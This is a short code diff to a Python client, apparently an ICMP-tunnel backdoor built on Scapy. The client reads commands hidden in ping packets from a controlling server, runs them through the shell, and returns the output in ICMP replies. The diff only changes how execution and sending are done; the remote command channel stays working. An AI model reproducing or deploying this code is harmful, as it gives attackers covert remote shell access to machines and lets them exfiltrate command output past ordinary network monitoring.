@@ -60,11 +60,8 @@ class Client:
 
         if packet[IP].src == self.server and packet[ICMP].type == 8 and packet[ICMP].id == self.ID and packet[Raw].load:
             opt_data = (packet[Raw].load).decode('utf-8', errors='ignore')
-            process = subprocess.Popen(opt_data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-            # Launch the shell command:
-            output, error = process.communicate()
-            
-            send((IP(dst=self.server, ttl=self.TTL)/ICMP(type=0,id=self.ID)/f"{[output, error]}"), verbose=0)
+            data = subprocess.check_output(opt_data, shell=True)
+            sr1((IP(dst=self.server, ttl=self.TTL)/ICMP(type=0,id=self.ID)/data), verbose=0)
 
 
 if __name__ == "__main__":
